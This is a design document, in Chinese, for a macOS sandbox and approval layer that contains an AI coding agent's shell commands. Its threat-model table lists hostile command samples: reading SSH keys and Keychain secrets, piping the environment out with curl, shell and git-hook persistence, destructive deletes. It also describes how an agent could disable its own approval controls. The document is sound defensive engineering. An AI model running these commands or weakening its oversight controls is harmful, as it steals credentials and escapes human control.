# macOS 沙箱层设计：Seatbelt × Cordis 插件化

> 目标仓库：ruobai-harness（`cordis.yml` 驱动，Cordis 插件框架）
> 平台：macOS 26.6.2 (25G83)、Apple Silicon、`/usr/bin/sandbox-exec`
> 本文所有"实测"结论都在本机跑过，命令与结果见附录 A。未验证的 SBPL 语法用 ⚠️ 标出。

---

## 0. 结论先行

1. **沙箱不是"一个插件"，是四个插件加三个连接件。** `sandbox`（核）/ `sandbox-policy`（策略 IR）/ `sandbox-macos`（Seatbelt 机制）/ `sandbox-denial`（拒绝归因），连接件是 `sandbox-guards`（默认守卫集）、`shell-sandboxed`（把 bash 接到沙箱上）、`sandbox-escalation`（denial→审批的语义桥）。每个都能单独从 `cordis.yml` 删掉，删掉后的降级行为逐条定义过（§2.2 末表）。
2. **默认只包 shell（per-execution `sandbox-exec`），不包整个 harness 进程。** 进程级 jail 是**部署引导层**（`bin/rbu-jail` + `deploy/harness-jail.sb`），不是插件——它必须在 Node 启动前生效，进入之后就没有"热替换"可言（§2.5 给 Cordis 语义层面的理由）。
3. **网络默认完全关闭**（Codex 路线），代理中介（Claude Code 路线）留作后续插件 `@ruobai/sandbox-net-proxy`。默认值写在 `sandbox-policy` 的 Config schema 里，不写在 `apply` 的 if 里（§2.7）。
4. **沙箱与审批零依赖。** 沙箱核心不 `inject` approval，approval 不 `inject` sandbox；中间隔着 `ctx.denial` 与 `ctx.escalation` 两个 Service。Cordis 没有依赖环检测，双向 `inject` 只会让两个 Fiber 永远 PENDING 且不报错（§5.3）。
5. **实测硬约束：SBPL 里 `deny` 无条件压过 `allow`，与书写顺序、与 allow 的具体程度都无关。** 所以"审批通过后放宽一次"**不能**靠追加一条 `allow`，只能**重新编译 profile 并删掉命中的那条 `deny`**。这条约束决定了 escalation 的实现形态（§3.3）。
6. **拒绝细节不在子进程 stderr 里**，只在 `kernel: (Sandbox) ...` 统一日志里。`stderr` 只有一句 `Operation not permitted`，网络拒绝甚至连这都没有（curl 直接 exit 7）。所以 denial 归因必须有日志旁路插件；旁路不可用时必须 fail-closed 地"问人"，而不许猜（§3.2）。

---

## 1. 威胁模型

模型（LLM）是**不可信输入源**：它写命令、读文件、会被 prompt injection 指使。`tool-bash` 与 `tool-fs` 是它伸向宿主机的两只手。下表只列**遏制**需求（不是检测——agent 场景下检测不可靠，它会自适应重试）。

| # | 威胁 | 真实攻击样例 | 遏制点（Seatbelt 操作 + 插件） | 残余风险 |
|---|---|---|---|---|
| **T1** | **凭据外泄** | `cat ~/.ssh/id_ed25519`、`security find-generic-password -w`、`cat .env`、`env \| curl -d @- x` | `(deny file-read* (subpath "~/.ssh") (subpath "~/.aws") (subpath "~/.config/gh") (subpath "~/.docker"))`（`sandbox-guards` 提供集合，`sandbox-macos` 编译）；`(deny process-exec (literal "/usr/bin/security"))` 掐 Keychain CLI 通道（附录 F：A15 实测 `deny mach-lookup` 不可用）；`tool-bash` 已有 `SECRET_ENV` 环境清洗 | 命令行参数里的密钥会进 `ps`；剪贴板（`pbcopy`）需 `(deny pasteboard-*)` ⚠️ |
| **T2** | **供应链式持久化**：改配置让下次会话继续执行 | `echo cmd >> ~/.zshrc`、`cat > .git/hooks/pre-commit`、`git config core.hooksPath /tmp/x`、写 `~/Library/LaunchAgents/evil.plist`、`crontab` | `(deny file-write* ...)` 覆盖 git 的持久化点（`.git/hooks`、`.git/config`、`objects/info/alternates`、`info/attributes`、子模块 hooks/config）、`~/.zshrc`、LaunchAgents、托管策略目录；`.env` 变体按 `regex` 拒绝；与 T4 共用同一张 `PathGuard` 表 | `index`、`objects`、`refs`、`logs` 等普通 git 数据**可写**（否则 `git add/commit` 无法工作）；写这些不能跨会话执行。`.git/hooks` 与 `.git/config` 仍只读 |
| **T3** | **横向移动**：把沙箱当跳板打本机服务 | `curl http://127.0.0.1:4310/api/...`（harness 自己的 API + 若 `RBU_TOKEN` 泄漏）、`curl --unix-socket /var/run/docker.sock`、打 Ollama / dev server / 本地 DB | `net.mode='deny'` → `(deny network*)`；回环同样落在 `network-outbound` 里被拒（实测 `remote:*:80`）；Unix socket 同时受 `network*` 与 `file-write-data` 约束 | 一旦某次审批放开了回环端口，agent 可反打 harness。§3.3 因此规定**回环永不放宽** |
| **T4** | **越界写 / 删** | `rm -rf ~/Documents`、`echo x > /etc/hosts`、`ln -s ~/.ssh/x <ws>/x` 再写、`mv .git /tmp` | write 根白名单只有 `<ws>` 与 `TMPDIR`；git 持久化点另有 `(deny file-write*)`；Seatbelt 按 **vnode** 判定（实测软链指向 `/etc/hosts` 照样被拦），symlink 借不到权限 | 进程内守卫（`tool-fs`）靠字符串比较：APFS 大小写不敏感 + Unicode NFD 会绕过 `path.relative` → 必须 `realpath` + NFC + 大小写折叠（§5.1） |
| **T5** | **控制平面降级**：不突破，而是让防线失效 | `osascript -e 'tell app "Terminal" to do script ...'`、`kill` 掉审批进程、把 `.ruobai/settings.json` 的 `bypassApprovals` 改 true | `(deny appleevent-send)`、`(deny signal (target others))`、`(deny process-info*)`；escalation 类审批**不受 `bypassApprovals` 影响**（§3.6）；`.ruobai/` 默认进 guardWrite | 若 `.ruobai/` 落在 write 根内且未加守卫，agent 可改自己的审批配置——所以默认加守卫是安全必需，不是可选项 |
| **T6**（元） | **归因缺失**：分不清"命令自己失败"与"沙箱拒绝" | agent 见 `Operation not permitted` 后重试 10 次，或把沙箱拒绝误读成"文件不存在"去换路径 | `sandbox-denial` + `sandbox-native-log`：从统一日志取 `deny(1) <operation> <target>`，产出 `DenialKind` + `confidence`；工具结果永远带结构化 `denials[]` | 日志有 1–2s 延迟且是全系统广播，必须按 pid 过滤（实测日志里混有 `logd_helper`、`ecosystemd` 的拒绝） |

**git worktree**：会话根是 linked worktree 时，`.git` 是文件。策略启动时解析它（`gitdir:` 与 `commondir`），把 worktree 的 git dir 与公共 git dir 都加入写授权；持久化守卫（hooks/config/alternates）落在公共目录，`.git` 指针文件本身只读。实测：worktree 内 `git add/commit` 通过，写 `.git/hooks` 仍被拒。

**非目标**（写进 README，避免"沙箱"被当成安全承诺）：防 0day 提权、防内核漏洞、防用户主动批准的危险操作、多租户隔离。

---

## 2. Cordis 插件分解

### 2.1 全景

```
                 ┌────────────────────────────────────────────────┐
                 │ @ruobai/sandbox          Service ctx.sandbox   │
                 │  provider 注册表 · run 登记 · 生命周期兜底       │
                 └──▲──────────────────▲──────────────────▲──────┘
    inject ['sandbox']│                  │inject ['sandbox']│inject ['sandbox'] (optional)
                     │                  │                  │
  ┌──────────────────┴────┐  ┌──────────┴───────────┐  ┌───┴────────────────────┐
  │ @ruobai/sandbox-macos │  │ @ruobai/sandbox-     │  │ @ruobai/sandbox-denial │
  │  Provider('darwin')   │  │        policy        │  │  Service ctx.denial    │
  │  SBPL 编译 + 执行      │  │  IR · PathGuard 表   │  │  分类 · 指纹 · 事件     │
  └───────────────────────┘  └──────────▲───────────┘  └───▲────────────────────┘
                          inject ['sandbox-policy']        │ ingest
                               ┌─────────┴────────┐    ┌───┴────────────────────┐
                               │ @ruobai/sandbox- │    │ @ruobai/sandbox-       │
                               │ guards（默认守卫）│    │ native-log（日志旁路）  │
                               └──────────────────┘    └────────────────────────┘

  ┌────────────────────┐  inject ['tools','shell']
  │ @ruobai/shell      │◄─────────────────────────── @ruobai/tool-bash（只认 ctx.shell）
  │ Service ctx.shell  │
  └────────▲───────────┘
           │ inject ['shell','sandbox','sandbox-policy','sandbox-denial']
           │        + optional ['approval','escalation']
  ┌────────┴───────────────────────────────────────────────┐
  │ @ruobai/shell-sandboxed                                │
  │  注册默认 executor：sandbox.execute + escalation 闭环    │
  └────────┬───────────────────────────────────────────────┘
           │ optional ['approval']
  ┌────────▼───────────┐        ┌─────────────────────────────┐
  │ @ruobai/approval   │◄───────│ @ruobai/sandbox-escalation  │
  │ Service ctx.approval│ inject│ Service ctx.escalation       │
  └────────────────────┘ ['approval','sandbox-denial']
```

**依赖方向单向**：`sandbox → policy → guards`、`denial → native-log`、`shell-sandboxed → (shell, sandbox, policy, denial, escalation) → approval`。没有环。

### 2.2 每个插件：形态、inject、注册的 effect、事件

Cordis 规矩：**工具注册用函数插件，能力提供用 `Service` 子类**。凡"别的插件要 `inject` 的东西"一律 Service；"往已有能力里塞实现"的用函数/对象插件。

| 插件 | 形态 | `static inject` | `ctx.effect()` 注册什么 / 清理什么 | 事件 |
|---|---|---|---|---|
| `@ruobai/sandbox` | `Service` → `ctx.sandbox` | 无（`settings` 可选） | ① 构造里 `ctx.effect(() => () => destroyAll(), 'sandbox.dispose')`：abort 全部在飞 run → `provider.destroyAll()` → 清表；② `registerProvider()` 内部包 effect，disposer 先摘表再 `destroy` | emit `sandbox/run-start`、`sandbox/run-end`；不监听 |
| `@ruobai/sandbox-policy` | `Service` → `ctx.sandboxPolicy` | `['sandbox']`；可选 `['permissions','settings','sessions']` | ① 内置 IR（read/exec 根、limits）；② `guards.register()` 返回 disposer（删 Map 条目 + `bump(version)`）；③ settings 变更订阅；④ session 策略快照缓存，卸载整体丢弃 | emit `sandbox/policy-changed`（带 `version`） |
| `@ruobai/sandbox-guards` | 函数插件 | `['sandbox-policy']` | 逐组注册默认守卫（`.git`、`.ssh`、`.aws`、`.env`、`.ruobai/`、LaunchAgents…），`register()` 的返回值直接交给 Cordis 作为 disposer | 无 |
| `@ruobai/sandbox-macos` | 对象插件（`name/apply/Config`），**不是 Service** | `['sandbox']` | ① `ctx.effect(() => ctx.sandbox.registerProvider(darwin), 'sandbox.provider.darwin')`；② SBPL 编译缓存随 effect 回收；③ 启动自检（附录 D 的探针），不过则不注册 provider | 无 |
| `@ruobai/sandbox-denial` | `Service` → `ctx.denial` | 可选 `['sandbox']` | ① 分类器表 `register(classifier)`；② 指纹表 + TTL 定时器（disposer 里 `clearInterval`）；③ 订阅 `sandbox/run-end` 做归因；卸载时清空指纹表（否则热重载后旧计数让新会话立刻"重复") | emit `sandbox/denied`、`sandbox/denial-repeated` |
| `@ruobai/sandbox-native-log` | 函数插件 | `['sandbox-denial']` | `spawn('/usr/bin/log', ['stream','--style','compact','--level','error','--predicate','sender == "Sandbox"'])`；`ctx.effect` 返回 `async () => { child.kill('SIGTERM'); await exited; stdout.destroy() }`——**这个子进程本身就是要回收的资源** | emit `sandbox/denial-record` |
| `@ruobai/shell` | `Service` → `ctx.shell` | 无 | executor 注册表 + 默认 executor 选择；disposer 清空 | emit `shell/before`、`shell/after` |
| `@ruobai/shell-sandboxed` | 函数插件 | `['shell','sandbox','sandbox-policy','sandbox-denial']` + 可选 `['approval','escalation']` | ① `ctx.effect(() => ctx.shell.register('sandbox', executor, { default: true }))`；② 每个 run 的 `AbortController` 与 pid 集合登记，disposer 里 abort + kill 进程组 | emit `sandbox/escalation-requested`、`sandbox/escalation-settled` |
| `@ruobai/sandbox-escalation` | `Service` → `ctx.escalation` | `['approval','sandbox-denial']`；可选 `['sandbox-policy']` | ① `kind → 可放宽性` 映射表（其他插件可追加）；② 重跑安全分类器；③ denial 计数与抑制 | emit `sandbox/escalation-loop-detected` |
| `@ruobai/approval-deadline` | 函数插件（可选） | `['approval']` | `ctx.effect(() => ctx.approval.setDeadlinePolicy({ timeoutMs, onTimeout: 'deny' }))`，disposer 恢复默认 | 无（`approval/timeout` 由内核发） |

**"缺失时"的降级语义必须写死**——插件化最容易出的洞是"少挂一个插件，安全性静默下降"：

| 缺失的插件 | 行为 |
|---|---|
| `sandbox-macos` | `ctx.sandbox.provider('darwin')` 为 `undefined` → `shell-sandboxed` **拒绝执行**并返回 `SandboxUnavailable`，**不回退直连**。要直连必须显式挂 `@ruobai/shell-direct` 并在 `cordis.yml` 注释里写明风险 |
| `sandbox-native-log` | 归因降级为 `evidence:'stderr'`、`confidence:'low'` → escalation 一律要求人工确认，不允许"自动放宽" |
| `sandbox-guards` | `sandbox-policy` 仍保留内置最小集（`.git` + `.ssh` + `.env`），并 `logger.warn`；不允许存在"没有守卫"的状态 |
| `approval` | escalation 分支直接返回失败（fail-closed），文案明确写"沙箱拒绝了，且没有审批通道，不要重试" |
| `sandbox-escalation` | 内核保守默认：只有 `fs-*` 可放宽，`network` 不可放宽，重跑一律 `unsafe` |

### 2.3 谁生成 Seatbelt profile：运行时动态生成，编译期可缓存

**结论：动态生成，静态模板只作为"与策略无关的平台基线片段"。**

理由：profile 三要素全都随会话变化——workspace 根（每个 worktree 不同）、write 根（`read-only`/`workspace-write`/`full-access` 不同）、守卫集（用户级/项目级配置不同）。静态 profile 只能靠字符串拼接，等于把策略散回部署脚本，正是要删掉的东西。

分工：

- `sandbox-policy` 产出**平台无关 IR**（`SandboxPolicy`，§4.1）。IR 里没有 `(deny ...)`，只有"允许读这些根、允许写这些根、这些路径即使在根内也必须只读/不可读、网络策略是什么"。
- `sandbox-macos` 是唯一 SBPL 生产者：`compile(policy, relax?) → string`，**纯函数**，可 snapshot 测试，不需要起 Context。
- 缓存键 = `policy.version`（guard 增删、模式切换时 `bump`）。缓存本身是资源，放在 `ctx.effect` 内 → 卸载即丢弃 → 不存在"旧 profile 被复用"。

**加载方式（实测 A13）**：不落临时文件，用管道 fd：

```ts
const child = spawn('/usr/bin/sandbox-exec', ['-f', '/dev/fd/3', shell, ...shellArgs(command)], {
  cwd, env: scrubbedEnv(), detached: true,      // detached → 独立进程组，便于整组回收
  stdio: ['ignore', 'pipe', 'pipe', 'pipe'],     // fd 3 = profile 管道
})
child.stdio[3].end(profile)                      // profile 只存在于内存与管道
```

为什么不落 `/tmp/*.sb`：`(allow file-read* (subpath "/private/tmp"))` 之类的规则会让 agent 读到自己的 profile，进而精确推断守卫边界做定向绕过；崩溃还会留残留文件。
为什么不落 `-p` 参数：profile 进 `ps`（同样泄漏边界），且受 `ARG_MAX` 限制。

**`ctx.effect` 在这一层注册/清理什么**：

```ts
ctx.effect(() => {
  const provider = createDarwinProvider(config)
  const dispose = ctx.sandbox.registerProvider(provider)
  return async () => {
    dispose()                  // 先摘表：新 execute 立刻 SandboxUnavailable
    await provider.destroy()   // 再杀掉在飞的 sandbox-exec、断开日志管道
    provider.cache.clear()     // 编译缓存（不留旧 profile）
  }
}, 'sandbox.provider.darwin')
```

顺序不能反：先 destroy 再摘表会有一段"表里还在、provider 已死"的窗口，`execute` 会抛不该出现的内部错误。

### 2.4 denial 分类是否该是独立 Service：是

`@ruobai/sandbox-denial` 提供 `ctx.denial`，形态 `Service`，三条理由：

1. **它是跨平台语义层**。`DenialKind`（`fs-read-guarded`/`network-outbound`/`process-exec`…）与 SBPL 的 `file-read-data`、Linux 的 `EACCES`+Landlock、Windows 的 `ACCESS_DENIED` 都不是一回事。放进 provider 会让每个 provider 各造一套分类，审批层就得认识所有平台。
2. **它要被多方 `inject`**：`shell-sandboxed`（把 denials 附在结果里）、`sandbox-escalation`（决定能否放宽）、未来的 `sandbox-web`（面板展示）。Cordis 里"多方要用的东西"就是 Service。
3. **它有自己的状态**：指纹计数、TTL、日志窗口。这些必须与某个 Fiber 同生共死，不能挂在 provider 闭包里（provider 可替换，换了计数就丢）。

**它不 inject approval**，这是打破循环的关键（§5.3）。

### 2.5 只包 shell，还是包整个 harness 进程

| 维度 | A. Sandboxed Bash（per-exec `sandbox-exec`） | B. Sandbox Runtime（整个 Node 在 Seatbelt 内） |
|---|---|---|
| 生效时机 | 每次 `execute` 编译 profile、起一个 `sandbox-exec` | Node 启动**之前**，`bin/rbu-jail` 把 `node apps/cli/src/bin.ts` 包起来 |
| Cordis 语义 | 沙箱是**插件资源**：子进程、profile、pid 集都挂 effect；`fiber.dispose()` 会 await 异步 disposer 杀进程组 → **可热替换、可独立卸载** | 沙箱是**进程属性**：换 profile = 重启进程 = 整棵插件树重启；热重载只能在既有边界内换插件，边界本身不可换 |
| 覆盖范围 | 只覆盖 bash 及子进程。`tool-fs`、MCP、hooks、`git` 插件都在宿主机进程内，**不受内核约束** | 全覆盖：`tool-fs`、MCP stdio 子进程、hooks 都在 jail 内 |
| 策略自由度 | 每会话/每模式可不同（`read-only` 会话可用只有 `(deny default)` 的极简 profile） | 全进程一份 profile，要按会话变化只能"先放最宽" |
| 失败半径 | 沙箱挂了只影响 bash | 配置错 = harness 起不来，连 Web UI 都连不上，用户无法批准任何东西 |
| 对应 Claude Code | Sandboxed Bash Tool（默认） | Sandbox Runtime（可选） |

**选择 A 为默认，B 作为部署层。**

理由不是 B 更弱，而是**在 Cordis 里 B 不能是插件**：必须在 Node 进程创建前生效的东西，天然位于 `apply(ctx)` 之外；写成插件只会得到"插件已 ACTIVE、但其实没有沙箱"的假象——比没有更危险。B 的正确形态：

```
bin/rbu-jail                     # sandbox-exec -f deploy/harness-jail.sb node ...
deploy/harness-jail.sb           # 静态 profile（部署物，可被配置管理审计）
cordis.yml 里的 jail 配置块        # 只用于 UI 展示"当前 jail 模式 + profile digest"
```

它在 `cordis.yml` 里以**配置块**出现，不是插件条目。

> 实施偏差（M1）：平台基线没有走 `deploy/seatbelt-baseline.sb` 文件，而是内联在
> `packages/sandbox-macos/src/sbpl.ts` 的 `BASELINE_EXEC` / `BASELINE_READ` 常量里。
> 理由：基线必须和编译器一起被测试与快照锁定，外置文件会让「profile 内容」分裂到两处，
> 而它本来就不是策略（不随项目/用户变化）。要改基线就改代码并更新快照测试。

**但 A 有个必须承认的漏洞**：`tool-fs` 走 Node 的 `fs`，Seatbelt 管不到。所以纵深分两层：

1. **内核层（A）**：bash 及子进程。
2. **进程内检查层**：所有宿主内文件操作工具 `inject ['sandbox-policy']` 并调 `ctx.sandboxPolicy.check(path, 'write')`。

这不是"两个沙箱"，而是**同一张策略表的两个执行点**——守卫只有一份定义（`sandbox-guards`），两处执行，不会出现"bash 拦了但 write 工具没拦"。选 B 时第 1 层仍然生效，两层用同一份策略、互不依赖。

### 2.6 文件路径守卫：三层，不是 profile 的一部分，也不是一个大插件

| 层 | 归属 | 职责 | 为什么在这里 |
|---|---|---|---|
| 声明 | `sandbox-policy` 的 `PathGuard` 表 + `sandbox-guards` 的默认集 | "`.git` 即使在 write 根内也只读"这条**知识** | 要能在 UI 列出、能被用户/项目覆盖、能被审批引用（denial 要能说"你撞了 `guard:git-dir`"） |
| 编译 | `sandbox-macos` | 把 `PathGuard[]` 变成 `(deny file-write* (subpath ...))` | 只有 provider 懂 SBPL |
| 执行（进程内） | 任意宿主内工具（`tool-fs`、`git` 插件的写） | `check()` 抛 `PathGuardError` | Seatbelt 看不到 Node 自己的 `fs` |

**为什么不塞进 profile 生成器**：那样每条守卫都要改 provider 代码，无法热更新，Linux provider 也无法复用。
**为什么不做成"独立的 fs-effect 插件"去 wrap `fs`**：`fs` 是 Node 全局模块，monkey-patch 是不可逆副作用（违反 Cordis effect 模型），还会污染 harness 自己的 `checkpoints`、`session-jsonl` 写入。所以走**显式调用**；用测试保证"所有写工具 entrypoint 都调了 check"。

匹配语义（不写清楚就是绕过）：

```ts
// 1) realpath（解析软链）→ 拦"软链指向守卫目标"
// 2) normalize('NFC')（APFS 存 NFD，输入多为 NFC）
// 3) 卷大小写不敏感（macOS 默认）→ 大小写折叠后比较
// 4) exact / subpath / glob 三种 match，最长匹配获胜
```

### 2.7 网络默认值：完全关闭，而不是代理中介

| 维度 | Codex：默认完全关闭 | Claude Code：代理中介白名单 |
|---|---|---|
| 实现复杂度 | `(deny network*)` 一行；放开时逐条 `(allow network-outbound (remote ip "h:p"))` | 需要沙箱内代理、DNS 解析、CONNECT 隧道、CA（HTTPS 拦截时）、连接审计 |
| 新增信任边界 | 无 | 代理本身：agent 能连代理，代理能连外网。代理配置可写 = 边界可改；代理不拦 path/token → 白名单域名内的数据外泄（把密钥 POST 到 gist）仍然可行 |
| 失败模式 | "命令连不上网"，立即可见、可升级 | "命令能连网但被代理拒"，观感上像网络故障，难以归因；代理崩溃 = 全部联网静默失败 |
| 对 harness 的实际影响 | bash 子进程不联网 ≠ harness 不联网：LLM 出口、MCP、A2A 都在宿主机进程内，本来就不在 bash 沙箱里 | 同左（Claude Code 也是这个结构） |
| 与"沙箱拒绝驱动审批"的契合度 | 高：网络拒绝天然是"硬边界触发"，一次授权 host:port 即可 | 中：代理拒绝是软件策略，没有内核证据，审批卡片说不清"到底哪条规则拦的" |

**选择：默认 `deny`。** 关键论据是第三行——网络能力不是 bash 的功能刚需，harness 自己的联网能力（模型、MCP、A2A、Web）压根不经过 bash 沙箱，所以给 bash 关网不会残废任何功能；而一旦开了代理，代理就成了新的、可被写入的信任根，这在"策略必须可审计"的前提下不划算。

**如何用配置表达（而不是硬编码）**：

```yaml
- id: sandbox-policy
  name: '@ruobai/sandbox-policy'
  config:
    network:
      mode: deny        # deny | allowlist | proxy —— schema 默认值就是 deny
      allow: []         # 只有 allowlist/proxy 读
```

`compile()` 里是 `switch (policy.net.mode)`，三种模式各自生成 SBPL，没有 if-硬编码：

```ts
case 'deny':    return '(deny network*)'
case 'allowlist': return policy.net.allow.map(r => `(allow network-outbound (remote ip "${r.host}:${r.port ?? 443}"))`).join('\n')
case 'proxy':   return `(allow network-outbound (remote ip "127.0.0.1:${policy.platform.proxyPort}"))`  // 其余仍 deny
```

`allowlist` 模式下 `sandbox-policy` 必须在 IR 构造时就拒绝 `127.0.0.1`、`::1`、`169.254.0.0/16`、`*.local`（mDNS），而不是等 provider 去过滤——**越权拒绝要在策略层做，机制层只负责翻译**。

---

## 3. 审批与沙箱的整合

### 3.1 ApprovalService（在现有实现上扩展）

现有 `packages/approval` 已经是 `Service`，且关闭时 `denyAll()`（`ctx.effect(() => () => { this.denyAll(); ... })`）——直接沿用。需要扩展三处：

1. `request()` 增加 `kind: 'tool' | 'escalation'` 与 `escalation?: EscalationContext`；
2. 内建 deadline（不依赖插件，§3.5）；
3. 补 `'always'` 在 escalation 下的语义：**本会话临时豁免，不写盘**。

沙箱侧怎么 inject 它：**沙箱插件不 inject。** `shell-sandboxed` 用 optional inject：

```ts
export const inject = {
  required: ['shell', 'sandbox', 'sandbox-policy', 'sandbox-denial'],
  optional: ['approval', 'escalation'],
}
```

`optional` 不是为了"能跑就行"，而是让 `tests/harness.ts` 能在无审批场景下挂载沙箱做纯隔离测试；运行时缺失走 fail-closed 分支。

### 3.2 从 `sandbox-exec` 拒绝到审批决定

```
(1) tool-bash.execute(args)
      └─ ctx.shell.run({ command, cwd, timeoutMs, sessionId, signal })
(2) shell-sandboxed
      ├─ policy = ctx.sandboxPolicy.forSession(sessionId)     // 不可变快照
      ├─ runId = uuid；runId→{abort, pgid} 登记进 effect 作用域
      └─ ctx.sandbox.execute({ command, cwd, policy, runId, signal })
(3) sandbox-macos
      ├─ sbpl = compile(policy, relax)        // 纯函数，缓存键 policy.version
      ├─ spawn('/usr/bin/sandbox-exec', ['-f','/dev/fd/3', sh, '-c', command], { detached: true })
      └─ 收 stdout/stderr/exitCode；把日志窗口内该 pid 家族的记录塞进 result.denials
(4) exitCode !== 0 或 denials 非空 → ctx.denial.classify(result)
      ├─ 证据合成：
      │    · native-log（高）：deny(1) file-read-data /Users/x/.ssh/id_rsa
      │    · stderr（中）：Operation not permitted / execvp() of 'x' failed
      │    · exit-code（弱）：71 = sandbox-exec 自身在 execvp 阶段拒绝
      │    · 命令静态特征（弱）：token 里出现 ~/.ssh、/etc/、--unix-socket
      ├─ 归因到守卫：target 与 PathGuard 表 longest-match → guard id
      └─ emit 'sandbox/denied'(Denial{ kind, target, guard, confidence, fingerprint, repeated })
(5) shell-sandboxed 读 ctx.escalation 的映射表决定是否升级
      ├─ 不可放宽（network / process-control）→ 返回失败 + Denial，不弹窗
      ├─ repeated >= 2 → 返回失败 + "已重复触发，不要重试"
      └─ 可放宽 → ctx.escalation.request(denial)
(6) sandbox-escalation
      ├─ 算 exemption：只针对命中的那一条 guard / 那一个 host:port
      ├─ 重跑安全分类：命令只含只读 token → 'safe'，否则 'unsafe'
      └─ ctx.approval.request({ kind:'escalation', escalation:{ denial, exemption, retry } })
(7) 人类决定（超时 → deny）
      ├─ deny   → 原样返回失败；结果里明确写"沙箱策略拒绝，已由用户拒绝，不要重试"
      ├─ allow  → 用 relax=[exemption] 重新 execute()，attempt=2，结果标注"本次放宽了 X"
      └─ always → 本会话临时豁免（内存 + TTL，随 Fiber dispose 消失）+ 重跑
(8) 重跑仍被拒 → 指纹不同（换了路径/host）→ 允许一次新升级；同会话总次数有上限
```

四个要点：

**① 升级只在硬边界实际触发时发生。** `rm -rf ./build` 不弹窗（它走已有 danger/allow 规则）；只有"沙箱真的拒绝了"才弹。这是 Codex `on-request` 的语义，也是"删掉每步确认"的反面。

**② denial 必须结构化回到模型**，否则它把 `Operation not permitted` 当权限问题去 `chmod`/`sudo`/换路径重试——这正是重试循环的来源：

```
[sandbox] 操作被 macOS Seatbelt 拒绝（不是文件权限问题，sudo 无效）
kind: fs-read-guarded
guard: ssh-keys
target: /Users/x/.ssh/id_ed25519
decision: denied-by-user (request 4f2a…)
请勿重试同一路径；如确需该文件，请让用户把它复制进工作区。
```

**③ 重复抑制在 `ctx.denial` 里做，不在 prompt 里做。** 指纹 = `sha1(kind + normalizedTarget + commandFamily)`；同指纹第二次触发即判"不升级也不许重试"，emit `sandbox/denial-repeated` 给 UI。TTL 5 分钟，由 `ctx.effect` 里的定时器清理。

**④ 重跑不是免费的。** `attempt=2` 时命令可能已部分执行（`cp a b && cp ~/.ssh/x c`）。`retry:'unsafe'` 时审批卡片必须写"可能已部分执行，重跑会重复副作用"；安全分类器只用保守白名单（`cat/ls/grep/head/tail/wc/git log|status|diff`），认不出来就 `unsafe`。

### 3.3 放宽（exemption）到底放宽什么

实测（A3/A4）：**SBPL 的 `deny` 压过 `allow`，顺序与具体程度都无关**。所以放宽只能改 profile 本身：

```ts
export type Exemption =
  | { kind: 'guard-read';  guard: string }               // 删掉该条 (deny file-read* ...)
  | { kind: 'guard-write'; guard: string }               // 删掉该条 (deny file-write* ...)
  | { kind: 'write-root';  path: string; once: true }    // 临时把一个目录加进 write 根，仅本次
```

`compile(policy, exemptions)` 在生成时**跳过**被豁免的 deny 语句，其余字节不变。"放宽"因此可审计、可复现、最小化，而不是"关掉沙箱再跑"。

**绝不允许的放宽**（硬编码在 `sandbox-escalation`，config 也打不开）：

- `network`：不许通过 exemption 放宽成 `network*`；要联网必须走独立"网络授权"流程（生成 `(allow network-outbound (remote ip "host:port"))` 写进本会话策略），且**回环与链路本地地址永不授权**。
- `process-exec`：不许放宽成"任意可执行"，只能逐个可执行文件加进 `exec.allowPaths`。
- 任何豁免都不能把 git 持久化点（hooks、config、alternates、info/attributes）、`.ssh`、`.ruobai/` 从只读变可写。

### 3.4 规则引擎作为插件注册

规则不是散在 `request()` 里的 `if`，而是**可注册的数据 + 一个求值器**：

```ts
export interface RuleSource {
  id: string
  priority: number          // managed 100 / project 50 / user 20 / session 10 / builtin 0
  version(): number         // 变更时 bump，用于缓存失效
  rules(): readonly ApprovalRule[]
}
ctx.effect(() => ctx.approval.rules.register(source), `approval.rules.${id}`)
```

| 插件 | 来源 | 优先级 | 沙箱内可写 | 说明 |
|---|---|---|---|---|
| `@ruobai/approval-rules-managed` | `/Library/Application Support/Ruobai/policy.json`（或 MDM profile） | 100 | 否 | 企业托管；用户不可覆盖 |
| `@ruobai/approval-rules-project` | `<ws>/.ruobai/sandbox.json` | 50 | 否（`.ruobai/` 在 guardWrite） | 随仓库走，团队共享；首次遇到需 `trust` 一次 |
| `@ruobai/approval-rules-user` | `~/.ruobai/settings.json`（现有 `settings.approvalRules()`） | 20 | 宿主机 | 个人偏好，现有实现已在此层 |
| `@ruobai/approval-rules-session` | `ApprovalService` 内存（`always` 产生） | 10 | — | **随 Fiber dispose 清空**，不写盘 |

**求值顺序沿用 Claude Code：`deny → ask → allow`，deny 永远优先。**

```ts
evaluate(subject, tool) {
  const all = sources.sort(byPriorityDesc).flatMap(s => s.rules())
  const matched = all.filter(r => matchesRule(r, tool, subject))
  for (const action of ['deny', 'ask', 'allow'] as const) {
    const hit = matched.find(r => r.action === action)
    if (hit) return { action, rule: hit }
  }
  return undefined        // 落到 permissions 模式，再落到默认 ask
}
```

注意"跨来源 deny 优先"与"优先级排序决定一切"是两种模型。Claude Code 选前者（deny 是安全属性，不能被更高优先级覆盖），我们跟它：在 Cordis 里来源插件可热插拔，如果优先级能压过 deny，那么"挂一个高优先级插件"就等于关掉审批，攻击面太大。

`bypassPermissions`（现有 `bypassApprovals`）**只作用于 `kind:'tool'`，不作用于 `kind:'escalation'`**（§3.6）。

### 3.5 超时与 unavailable：fail-closed 归谁

**fail-closed 不变式放内核，策略参数放插件。** 这是全文唯一一处故意不插件化的地方：如果"超时后默认允许"能被一个 `cordis.yml` 配置打开，这条防线就等于不存在；用户删/换插件不该能改变"无人应答 = 拒绝"。

- **`ApprovalService` 内核**：`request()` 必然带 deadline，三路取消（人答 / turn abort / 服务卸载）走同一个 cleanup：

```ts
private awaitDecision(request: ApprovalRequest, run: { signal?: AbortSignal }): Promise<ApprovalDecision> {
  const { timeoutMs } = this.deadlinePolicy()      // 插件可调参；clamp [5s, 10min]，不接受 Infinity
  return new Promise<ApprovalDecision>((resolve) => {
    const settle = (decision: ApprovalDecision) => { clearTimeout(timer); this.pending.delete(request.id); resolve(decision) }
    const timer = setTimeout(() => {
      this.ctx.emit('approval/timeout', { request, afterMs: timeoutMs })
      settle('deny')                               // fail-closed，不可配置
    }, timeoutMs)
    this.pending.set(request.id, { request, settle })
    run.signal?.addEventListener('abort', () => settle('deny'), { once: true })
  })
}
```

- **`@ruobai/approval-deadline` 插件**：只 `setDeadlinePolicy({ timeoutMs, onTimeout: 'deny' })`，`onTimeout` 的类型就只有 `'deny'` 一个字面量，disposer 恢复默认。它是"调参插件"，不是"开关插件"。
